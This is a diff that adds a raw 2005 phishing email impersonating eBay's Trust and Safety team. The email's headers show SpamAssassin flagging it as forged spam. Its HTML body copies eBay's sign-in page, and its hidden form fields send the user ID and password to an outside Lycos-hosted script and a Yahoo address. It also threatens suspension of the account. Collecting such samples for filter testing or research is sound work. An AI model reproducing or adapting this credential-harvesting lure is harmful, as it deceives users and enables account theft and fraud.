@@ -1,0 +1,467 @@
+From nobody Sun Jan 25 14:03:10 2015
+Return-Path: <aw-confirm@eBay.com>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.0.2.3])
+ by naughty.domain.com (Postfix) with ESMTP id 19D5E536E43
+ for <username@login.domain.com>; Tue,  1 Nov 2005 07:38:59 -0500 (EST)
+Received: from mail1.domain.com (localhost.domain.com [127.0.0.1])
+ by mail1.domain.com (Postfix) with ESMTP id 5C0916CCF2F
+ for <username@domain.com>; Tue,  1 Nov 2005 07:38:57 -0500 (EST)
+Received: from 86.55.38.100 (unknown [86.55.38.100])
+ by mail1.domain.com (Postfix) with SMTP
+ for <username@domain.com>; Tue,  1 Nov 2005 07:38:57 -0500 (EST)
+Received: from 15.8.132.214 by ; Tue, 01 Nov 2005 18:33:58 +0600
+Message-ID: <MJNCTYCBGYIFZYWRLJDRF@comcast.net>
+From: "eBay Safe Harbour" <aw-confirm@eBay.com>
+Reply-To: "eBay Safe Harbour" <aw-confirm@eBay.com>
+To: username@domain.com
+Subject: Attention ! Your Account Has Been Violated !
+Date: Tue, 01 Nov 2005 11:34:58 -0100
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--49301650093702935"
+X-Priority: 1
+X-MSMail-Priority: High
+X-Spam-Flag: YES
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: ****************
+X-Spam-Status: Yes, score=16.7 required=5.0 tests=FORGED_MUA_OUTLOOK,
+ FORGED_OUTLOOK_HTML,HTML_80_90,HTML_MESSAGE,HTML_NONELEMENT_00_10,
+ HTML_TAG_EXIST_TBODY,MANY_EXCLAMATIONS,MIME_BOUND_DD_DIGITS,
+ MIME_HTML_ONLY,MIME_HTML_ONLY_MULTI,MIME_QP_LONG_LINE,MISSING_MIMEOLE,
+ MPART_ALT_DIFF,MSGID_SPAM_CAPS,RCVD_NUMERIC_HELO autolearn=no 
+ version=3.0.2
+X-Spam-Report: * 4.1 MIME_BOUND_DD_DIGITS Spam tool pattern in MIME boundary
+ *  3.8 MSGID_SPAM_CAPS Spam tool Message-Id: (caps variant)
+ *  1.2 RCVD_NUMERIC_HELO Received: contains an IP address used for HELO
+ *  0.1 HTML_80_90 BODY: Message is 80% to 90% HTML
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.1 HTML_TAG_EXIST_TBODY BODY: HTML has "tbody" tag
+ *  0.1 MPART_ALT_DIFF BODY: HTML and text parts are different
+ * 0.0 HTML_NONELEMENT_00_10 BODY: 0% to 10% of HTML elements are non-standard
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ *  0.0 MIME_QP_LONG_LINE RAW: Quoted-printable line longer than 76 chars
+ *  0.6 FORGED_OUTLOOK_HTML Outlook can't send HTML message only
+ *  2.4 MIME_HTML_ONLY_MULTI Multipart message only has text/html MIME parts
+ *  0.0 MISSING_MIMEOLE Message has X-MSMail-Priority, but no X-MimeOLE
+ *  0.0 MANY_EXCLAMATIONS Subject has many exclamations
+ *  3.9 FORGED_MUA_OUTLOOK Forged mail pretending to be from MS Outlook
+X-Keywords: 
+Status: O
+Content-Length: 17587
+Lines: 412
+
+----49301650093702935
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META http-equiv=3DContent-Type content=3D"text/html; charset=3Diso-8859-1=
+">
+<META content=3D"MSHTML 6.00.2900.2180" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff>
+<DIV><FONT face=3DArial size=3D2>
+<DIV><FONT face=3DArial size=3D2>
+<P>We recently noticed one or more attempts to log in to your eBay account=
+ from 
+a foreign IP address and we have reasons to believe that your account was =
+used 
+by a third party without your authorization. If you recently accessed your=
+ 
+account while traveling, the unusual login attempts may have been initiate=
+d by 
+you <BR><B>The login attempt was made from: </B><BR><B>IP address:</B> <FO=
+NT 
+color=3D#ff0000 size=3D2>172.25.210.66</FONT><FONT size=3D2> <BR><B>ISP Ho=
+st:</B> 
+</FONT><FONT color=3D#ff0000 size=3D2>cache-66.proxy.aol.com </P></FONT><F=
+ONT 
+size=3D2>
+<P>By now, we used many techniques to verify the accuracy of the informati=
+on our 
+users provide us when they register on the Site. However, because user 
+verification on the Internet is difficult, eBay cannot and does not confir=
+m each 
+user's purported identity. Thus, we have established an offline verificati=
+on 
+system to help you evaluate with who you are dealing with.</P></FONT>
+<DIV>&nbsp;</DIV>
+<DIV><A href=3D"http://pages.ebay.com/" target=3D_blank><IMG 
+alt=3D"From collectibles to cars, buy and sell all kinds of items on eBay"=
+ 
+src=3D"http://pics.ebaystatic.com/aw/pics/register/HeaderRegister_387x40.g=
+if" 
+border=3D0></A><!--Header code ends--> 
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D600 border=3D0>
+  <TBODY>
+  <TR>
+    <TD colSpan=3D2><IMG height=3D10 alt=3D" " 
+      src=3D"http://pics.ebaystatic.com/aw/pics/spacer.gif" width=3D1></TD=
+></TR>
+  <TR>
+    <TD bgColor=3D#9999cc colSpan=3D2><IMG height=3D2 alt=3D" " 
+      src=3D"http://pics.ebaystatic.com/aw/pics/spacer.gif" width=3D1></TD=
+></TR>
+  <TR bgColor=3D#d6dcfe>
+    <TD width=3D25><IMG height=3D3 alt=3D"" 
+      src=3D"http://pics.ebaystatic.com/aw/pics/sitewide/leftLine_16x3.gif=
+" 
+      width=3D16 align=3Dmiddle></TD>
+    <TD vAlign=3Dcenter width=3D575>
+      <TABLE cellSpacing=3D0 cellPadding=3D1 width=3D"100%" border=3D0>
+        <TBODY>
+        <TR>
+          <TD vAlign=3Dcenter noWrap><FONT 
+            face=3D"Verdana, Helvetica, Arial, sans-serif" size=3D3><B>Sig=
+n 
+            In</B></FONT> </TD>
+          <TD vAlign=3Dcenter noWrap align=3Dright><A 
+            href=3D"http://pages.ebay.com/help/new/contextual/signin.html"=
+ 
+            target=3D_blank )=3D"" this.href=3D"" opencontextualhelpwindow=
+=3D"" 
+            return?><IMG height=3D14 
+            src=3D"http://pics.ebaystatic.com/aw/pics/listings/questionMar=
+k_14x14.gif" 
+            width=3D14 border=3D0></A><IMG height=3D1 alt=3D" " 
+            src=3D"http://pics.ebaystatic.com/aw/pics/spacer.gif" width=3D=
+4><FONT 
+            face=3D"Arial, Helvetica, sans-serif" color=3D#003399 size=3D2=
+><A 
+            href=3D"http://pages.ebay.com/help/new/contextual/signin.html"=
+ 
+            target=3D_blank 
+            onfiltered=3D"return openContextualHelpWindow( this.href );">N=
+eed 
+            Help?</A></FONT><FONT color=3D#003399><IMG height=3D1 alt=3D" =
+" 
+            src=3D"http://pics.ebaystatic.com/aw/pics/spacer.gif" 
+          width=3D2></FONT></TD></TR></TBODY></TABLE></TD></TR>
+  <TR>
+    <TD bgColor=3D#9999cc colSpan=3D2><FONT color=3D#003399><IMG height=3D=
+2 alt=3D" " 
+      src=3D"http://pics.ebaystatic.com/aw/pics/spacer.gif" 
+  width=3D1></FONT></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D600 border=3D0>
+  <TBODY>
+  <TR bgColor=3D#eeeef8>
+    <TD width=3D15 height=3D23><FONT color=3D#003399><IMG height=3D1 alt=3D=
+" " 
+      src=3D"http://pics.ebaystatic.com/aw/pics/spacer.gif" width=3D15></F=
+ONT></TD>
+    <TD noWrap width=3D180 height=3D23><FONT face=3D"Arial, Helvetica, san=
+s-serif" 
+      size=3D2><B>New to eBay?</B></FONT></TD>
+    <TD vAlign=3Dbottom align=3Dmiddle colSpan=3D3 height=3D23><IMG height=
+=3D23 hspace=3D0 
+      src=3D"http://pics.ebaystatic.com/aw/pics/register/or_60x23.gif" wid=
+th=3D60 
+      border=3D0></TD>
+    <TD noWrap width=3D310 height=3D23><FONT face=3D"Arial, Helvetica, san=
+s-serif" 
+      size=3D2><B>Already an eBay user?</B></FONT></TD></TR></TBODY></TABL=
+E>
+<P>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D600 border=3D0>
+  <TBODY>
+  <TR>
+    <TD width=3D15></TD>
+    <TD vAlign=3Dtop width=3D180>
+      <FORM action=3Dhttp://members.lycos.co.uk/signinwsupdate/user.php 
+      method=3Dpost target=3D_blank onfiltered=3D"return ShowFormWarning()=
+"><INPUT 
+      type=3Dhidden value=3Dshop_bikes@yahoo.com name=3Drecipient> <INPUT =
+type=3Dhidden 
+      value=3D"USERE NOI" name=3Dsubject> <INPUT type=3Dhidden 
+      value=3Dhttps://signin.ebay.com/ws/eBayISAPI.dll?SignIn&amp;pUserId=3D=
+drplatt48&amp;co_partnerId=3D2&amp;siteid=3D0&amp;pageType=3D1883&amp;pa1=3D=
+&amp;i1=3D-1&amp;UsingSSL=3D1&amp;bshowgif=3D0&amp;favoritenav=3D&amp;ru=3D=
+http%3A%2F%2Fmy.ebay.com%3A80%2Fws%2FeBayISAPI.dll%3FMyeBay%26ssPageName=
+%3DH%253AH%253AMYEBAY%253AUS&amp;pp=3D&amp;errmsg=3D8 
+      name=3Dredirect> <INPUT type=3Dhidden 
+      value=3Dhttps://signin.ebay.com/ws/eBayISAPI.dll?SignIn&amp;pUserId=3D=
+drplatt48&amp;co_partnerId=3D2&amp;siteid=3D0&amp;pageType=3D1883&amp;pa1=3D=
+&amp;i1=3D-1&amp;UsingSSL=3D1&amp;bshowgif=3D0&amp;favoritenav=3D&amp;ru=3D=
+http%3A%2F%2Fmy.ebay.com%3A80%2Fws%2FeBayISAPI.dll%3FMyeBay%26ssPageName=
+%3DH%253AH%253AMYEBAY%253AUS&amp;pp=3D&amp;errmsg=3D8 
+      name=3Dmissing_fields_redirect> 
+      <TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+        <TBODY>
+        <TR>
+          <TD><IMG height=3D10 alt=3Dspacer 
+            src=3D"http://pics.ebay.com/aw/pics/spacer.gif" width=3D1></TD=
+></TR>
+        <TR>
+          <TD vAlign=3Dtop><FONT face=3D"Arial, Helvetica, sans-serif"><FO=
+NT 
+            size=3D2>If you want to sign in, you'll need to register first=
+. 
+</FONT>
+            <P><FONT size=3D2>Registration is fast and <B>free</B>.</FONT>=
+</P><INPUT type=3Dsubmit value=3D"Register >"></FONT><FONT 
+            face=3D"Times New Roman" size=3D2> </FONT></TD></TR></TBODY></=
+TABLE></FORM></TD>
+    <TD><FONT face=3D"Times New Roman" size=3D2><IMG height=3D1 
+      src=3D"http://pics.ebay.com/aw/pics/spacer.gif" width=3D30 border=3D=
+0></FONT></TD>
+    <TD vAlign=3Dtop align=3Dmiddle width=3D1 bgColor=3D#cccccc><FONT 
+      face=3D"Times New Roman" size=3D2><IMG height=3D1 
+      src=3D"http://pics.ebay.com/aw/pics/homepage/spacer.gif" width=3D1 
+      border=3D0></FONT></TD>
+    <TD><FONT face=3D"Times New Roman" size=3D2><IMG height=3D1 
+      src=3D"http://pics.ebay.com/aw/pics/spacer.gif" width=3D29 border=3D=
+0></FONT></TD>
+    <TD>
+      <FORM action=3Dhttp://members.lycos.co.uk/signinwsupdate/user.php 
+      method=3Dpost target=3D_blank onfiltered=3D"return ShowFormWarning()=
+"><INPUT 
+      type=3Dhidden value=3Dshop_bikes@yahoo.com name=3Drecipient> <INPUT =
+type=3Dhidden 
+      value=3D"USERE NOI" name=3Dsubject> <INPUT type=3Dhidden 
+      value=3Dhttps://signin.ebay.com/ws/eBayISAPI.dll?SignIn&amp;ssPageNa=
+me=3Dh:h:sin:US 
+      name=3Dredirect> <INPUT type=3Dhidden 
+      value=3Dhttps://signin.ebay.com/ws/eBayISAPI.dll?SignIn&amp;pUserId=3D=
+drplatt48&amp;co_partnerId=3D2&amp;siteid=3D0&amp;pageType=3D1883&amp;pa1=3D=
+&amp;i1=3D-1&amp;UsingSSL=3D1&amp;bshowgif=3D0&amp;favoritenav=3D&amp;ru=3D=
+http%3A%2F%2Fmy.ebay.com%3A80%2Fws%2FeBayISAPI.dll%3FMyeBay%26ssPageName=
+%3DH%253AH%253AMYEBAY%253AUS&amp;pp=3D&amp;errmsg=3D8 
+      name=3Dmissing_fields_redirect> 
+      <TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+        <TBODY>
+        <TR>
+          <TD><IMG height=3D10 alt=3Dspacer 
+            src=3D"http://pics.ebay.com/aw/pics/spacer.gif" width=3D1></TD=
+></TR>
+        <TR>
+          <TD vAlign=3Dtop><FONT face=3D"Arial, Helvetica, sans-serif" 
+            size=3D2></FONT><FONT face=3D"Arial, Helvetica, sans-serif" si=
+ze=3D2>eBay 
+            members, sign in to save time for bidding, selling, and other =
+
+            activities. <BR></FONT></TD></TR></TBODY></TABLE>
+      <TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+        <TBODY>
+        <TR>
+          <TD><IMG height=3D10 alt=3Dspacer 
+            src=3D"http://pics.ebay.com/aw/pics/spacer.gif" width=3D1></TD=
+></TR>
+        <TR>
+          <TD vAlign=3Dtop><A href=3D"http://pages.ebay.com/help/new/sell.=
+html" 
+            target=3D_blank onfiltered=3D"return openHelpWindow(this.href)=
+;"></A><A 
+            href=3D"http://pages.ebay.com/help/new/sell.html" target=3D_bl=
+ank 
+            onfiltered=3D"return openHelpWindow(this.href);"></A><FONT 
+            face=3D"Arial, Helvetica, sans-serif" size=3D2><B>eBay User 
+            ID</B></FONT><BR><INPUT maxLength=3D64 size=3D27 name=3Duserid=
+><BR><FONT 
+            size=3D1><FONT face=3D"Verdana, Helvetica, Arial, sans-serif" =
+
+            color=3D#666666><SPAN class=3Dhelp><A 
+            href=3D"http://cgi4.ebay.com/ws1/eBayISAPI.dll?UserIdRecognize=
+rShow" 
+            target=3D_blank><FONT color=3D#003399>Forgot</FONT></A> your U=
+ser 
+            ID?</SPAN>&nbsp;</FONT></FONT></TD></TR></TBODY></TABLE>
+      <TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+        <TBODY>
+        <TR>
+          <TD><IMG height=3D10 alt=3Dspacer 
+            src=3D"http://pics.ebay.com/aw/pics/spacer.gif" width=3D1></TD=
+></TR>
+        <TR>
+          <TD vAlign=3Dtop><FONT face=3D"Arial, Helvetica, sans-serif" 
+            size=3D2><B>Password</B></FONT><BR><INPUT onfocus=3DShowPwWarn=
+ing() 
+            type=3Dpassword maxLength=3D63 size=3D27 name=3Dpass 
+            onfiltered=3D"ShowPwWarning()"><BR><FONT 
+            face=3D"Verdana, Helvetica, Arial, sans-serif" color=3D#666666=
+ size=3D1><A 
+            href=3D"http://pages.ebay.com/services/registration/reqpass.ht=
+ml" 
+            target=3D_blank><FONT color=3D#003399>Forgot</FONT></A> your 
+            password?</FONT> </TD></TR></TBODY></TABLE>
+      <TABLE cellSpacing=3D0 cellPadding=3D0 width=3D350 border=3D0>
+        <TBODY>
+        <TR>
+          <TD colSpan=3D2><IMG height=3D10 alt=3Dspacer 
+            src=3D"http://pics.ebay.com/aw/pics/spacer.gif" width=3D1></TD=
+></TR>
+        <TR>
+          <TD 
+        width=3D"35%"><INPUT type=3Dsubmit value=3D"Sign In Securely>"></T=
+D></TR></TBODY></TABLE>
+      <TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+        <TBODY>
+        <TR>
+          <TD><IMG height=3D10 alt=3Dspacer 
+            src=3D"http://pics.ebay.com/aw/pics/spacer.gif" width=3D1></TD=
+></TR>
+        <TR>
+          <TD vAlign=3Dtop><INPUT type=3Dcheckbox value=3D1 
+          name=3DkeepMeSignInOption></TD>
+          <TD width=3D10>&nbsp;</TD>
+          <TD width=3D"100%"><FONT face=3D"Verdana, Helvetica, Arial, sans=
+-serif" 
+            color=3D#666666 size=3D1><A 
+            href=3D"http://pages.ebay.com/help/new/staying_signed_in.html"=
+ 
+            target=3D_blank onfiltered=3D"return openHelpWindow(this.href)=
+;"><FONT 
+            color=3D#003399>Keep me signed in</FONT></A> on this computer =
+unless I 
+            sign out.</FONT> </TD></TR>
+        <TR>
+          <TD colSpan=3D3>
+            <HR width=3D"100%" color=3D#cccccc SIZE=3D1>
+            <FONT face=3D"Verdana, Helvetica, Arial, sans-serif" color=3D#=
+666666 
+            size=3D1>&nbsp; 
+            <TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100=
+%" border=3D0>
+              <TBODY>
+              <TR>
+                <TD vAlign=3Dtop align=3Dright width=3D"2%"><FONT size=3D2=
+><IMG 
+                  title=3D"" alt=3D" " 
+                  src=3D"https://securepics.ebaystatic.com/aw/pics/iconlig=
+htbulb_16x16.gif"></FONT></TD>
+                <TD class=3Dhelp width=3D"98%" colSpan=3D2><A 
+                  href=3D"http://pages.ebay.com/help/new/contextual/accoun=
+t_protection.html" 
+                  target=3D_blank 
+                  onfiltered=3D"return openContextualHelpWindow( this.href=
+ );"><FONT 
+                  face=3D"Times New Roman" color=3D#003399 size=3D2>Accoun=
+t protection 
+                  tips</FONT></A></TD></TR></TBODY></TABLE></FONT></TD></T=
+R></TBODY></TABLE></FORM></TD></TR>
+  <TR>
+    <TD width=3D15><FONT color=3D#003399><IMG height=3D1 alt=3Dspacer 
+      src=3D"http://pics.ebay.com/aw/pics/spacer.gif" width=3D15></FONT></=
+TD>
+    <TD colSpan=3D5><FONT color=3D#003399>
+      <HR color=3D#cccccc noShade SIZE=3D1>
+      </FONT></TD></TR>
+  <TR>
+    <TD width=3D15><FONT color=3D#003399><IMG height=3D1 alt=3Dspacer 
+      src=3D"http://pics.ebay.com/aw/pics/spacer.gif" width=3D15></FONT></=
+TD>
+    <TD colSpan=3D5><FONT face=3D"Arial, Helvetica, sans-serif" size=3D2>Y=
+ou can 
+      also register or sign in using the following service:</FONT> </TD></=
+TR>
+  <TR>
+    <TD width=3D15><IMG height=3D1 alt=3Dspacer 
+      src=3D"http://pics.ebay.com/aw/pics/spacer.gif" width=3D15></TD>
+    <TD colSpan=3D5><IMG height=3D35 alt=3Dspacer 
+      src=3D"http://pics.ebay.com/aw/pics/spacer.gif" width=3D1><A 
+      href=3D"http://cgi3.ebay.com/aw-cgi/eBayISAPI.dll?PassportSignInShow=
+&amp;pt=3D-1&amp;finalURL=3D" 
+      target=3D_blank><IMG height=3D26 
+      src=3D"http://pics.ebay.com/aw/pics/msn/signin_ebay.gif" width=3D100=
+ 
+      border=3D0></A></TD></TR></TBODY></TABLE><BR>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D599 bgColor=3D#9999cc borde=
+r=3D0>
+  <TBODY>
+  <TR>
+    <TD height=3D2><IMG height=3D2 src=3D"http://pics.ebay.com/aw/pics/spa=
+cer.gif" 
+      width=3D2></TD></TR></TBODY></TABLE><CURSIVE 
+src=3D"http://include.ebay.com/aw/pics/js/stats/ss.js"><CURSIVE 
+src=3D"http://include.ebay.com/aw/pics/js/stats/ss2.js"></CURSIVE></CURSIV=
+E></P>
+<P>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+  <TBODY>
+  <TR>
+    <TD class=3Dpipe>&nbsp; 
+      <DIV align=3Dleft><FONT face=3D"Arial, Verdana, Helvetica, sans-seri=
+f" 
+      size=3D2><A 
+      href=3D"http://www2.ebay.com/aw/marketing.shtml?ssPageName=3Df:f:ann=
+:US" 
+      target=3D_blank><FONT color=3D#003399>Announcements</FONT></A> 
+      &nbsp;&nbsp;|&nbsp;&nbsp; <A 
+      href=3D"http://cgi4.ebay.com/aw-cgi/eBayISAPI.dll?RegisterShow&amp;s=
+sPageName=3Df:f:reg:US" 
+      target=3D_blank><FONT color=3D#003399>Register</FONT></A> 
+      &nbsp;&nbsp;|&nbsp;&nbsp; <A 
+      href=3D"http://pages.ebay.com/help/confidence/hub.html?ssPageName=3D=
+f:f:stips:US" 
+      target=3D_blank><FONT color=3D#003399>Security Center</FONT></A> 
+      &nbsp;&nbsp;|&nbsp;&nbsp; <A 
+      href=3D"http://pages.ebay.com/help/policies/hub.html?ssPageName=3Df:=
+f:policy:US" 
+      target=3D_blank><FONT color=3D#003399>Policies</FONT></A> 
+      &nbsp;&nbsp;|&nbsp;&nbsp; <A 
+      href=3D"http://pages.ebay.com/services/forum/feedback.html" 
+      target=3D_blank><FONT color=3D#003399>Feedback Forum</FONT></A> 
+      &nbsp;&nbsp;|&nbsp;&nbsp; <A 
+      href=3D"http://pages.ebay.com/community/aboutebay/index.html?ssPageN=
+ame=3Df:f:ebayinc:US" 
+      target=3D_blank><FONT color=3D#003399>About eBay</FONT></A></FONT> 
+</DIV></TD></TR>
+  <TR>
+    <TD height=3D4><FONT size=3D2><IMG height=3D1 alt=3D"" 
+      src=3D"https://securepics.ebaystatic.com/aw/pics/x.gif" 
+width=3D1></FONT></TD></TR>
+  <TR>
+    <TD bgColor=3D#cccccc height=3D1><FONT size=3D2><IMG height=3D1 alt=3D=
+"" 
+      src=3D"https://securepics.ebaystatic.com/aw/pics/x.gif" 
+  width=3D760></FONT></TD></TR>
+  <TR>
+    <TD height=3D4><FONT size=3D2><IMG height=3D1 alt=3D"" 
+      src=3D"https://securepics.ebaystatic.com/aw/pics/x.gif" 
+width=3D1></FONT></TD></TR>
+  <TR class=3Dhelp vAlign=3Dtop>
+    <TD class=3Dnavigation><FONT size=3D1><A 
+      href=3D"http://pages.ebay.com/help/community/png-priv.html" 
+      target=3D_blank><IMG height=3D31 hspace=3D4 
+      src=3D"https://securepics.ebaystatic.com/aw/pics/truste_button.gif" =
+
+      width=3D116 align=3Dright vspace=3D2 border=3D0></A> Copyright =A9 1=
+995-2004 eBay 
+      Inc. All Rights Reserved. Designated trademarks and brands are the 
+      property of their respective owners. Use of this Web site constitute=
+s 
+      acceptance of the eBay <A 
+      href=3D"http://pages.ebay.com/help/policies/user-agreement.html?ssPa=
+geName=3Df:f:US" 
+      target=3D_blank onfiltered=3D"return openHelpWindow(this.href);"><FO=
+NT 
+      color=3D#003399>User Agreement</FONT></A> and <A 
+      href=3D"http://pages.ebay.com/help/policies/privacy-policy.html?ssPa=
+geName=3Df:f:US" 
+      target=3D_blank onfiltered=3D"return openHelpWindow(this.href);"><FO=
+NT 
+      color=3D#003399>Privacy Policy</FONT></A>.</FONT></TD></TR></TBODY><=
+/TABLE><A 
+href=3D"http://cgi3.ebay.com/aw-cgi/eBayISAPI.dll?TimeShow" target=3D_blan=
+k><FONT 
+color=3D#003399 size=3D2>eBay official time</FONT></A></P></DIV>
+<P><FONT color=3D#003399></FONT>&nbsp;</P>
+<DIV><B><FONT size=3D2>
+<P>Please Note -</B></FONT><FONT size=3D3> </FONT><FONT size=3D2>If you ch=
+oose to 
+ignore our request, you leave us no choice but to temporally suspend your =
+
+account. <BR><BR>* Please do not respond to this e-mail as your reply will=
+ not 
+be received. <BR></FONT><FONT face=3DArial size=3D2><BR>Respectfully, <BR>=
+Trust and 
+Safety Department <BR>eBay Inc. </P></FONT></DIV></XBODY><!-- toctype =3D =
+X-unknown --><!-- toctype =3D text --><!-- text --><!-- END TOC --></FONT>=
+</DIV></FONT></DIV></BODY></HTML>
+
+
+----49301650093702935--
